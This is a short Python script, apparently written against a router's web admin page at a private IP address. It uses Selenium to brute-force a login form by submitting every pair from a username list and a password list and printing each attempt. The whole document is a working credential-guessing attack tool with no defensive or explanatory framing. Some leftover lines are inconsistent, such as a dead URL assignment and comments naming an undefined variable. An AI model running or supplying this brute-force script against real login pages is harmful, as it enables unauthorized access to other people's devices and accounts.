from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

target_url = "http://www.python.org"
target_url = "http://192.168.98.130"

# login field information
user_field_css = 'userName'
pw_field_id_css = 'pcPassword'
user_field_name = 'username'
pw_field_id_name = 'password'


# local files
pwListFile = 'pwList.txt'
userListFile = 'userList.txt'

driver = webdriver.Firefox()
driver.get(target_url)

with open(userListFile, 'r') as users:
    for user in users:
        with open(pwListFile, 'r') as passwords:
            for password in passwords:
                # elem = driver.find_element_by_css_selector(user_field_css)
                elem = driver.find_element_by_name(user_field_name)
                elem.clear()
                elem.send_keys(user)
                time.sleep(1)
                # elem = driver.find_element_by_css_selector(pw_field_css)
                elem = driver.find_element_by_name(pw_field_id_name)
                elem.clear()
                elem.send_keys(password)
                elem.send_keys(Keys.RETURN)
                time.sleep(3)
                print(f'\nEntered {user}, {password}\n')

